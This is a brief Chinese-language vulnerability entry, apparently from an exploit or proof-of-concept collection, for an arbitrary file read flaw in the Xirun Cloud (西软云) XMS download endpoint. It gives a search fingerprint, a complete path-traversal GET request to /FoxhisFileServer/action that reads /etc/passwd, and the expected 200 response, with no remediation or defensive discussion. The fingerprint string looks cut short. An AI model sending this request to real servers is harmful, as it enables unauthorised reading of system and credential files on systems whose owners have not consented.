# 西软云XMSdownload存在任意文件读取漏洞

西软云 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="href=\"`
- **请求**：`GET /FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd HTTP/1.1`
- **响应特征**：200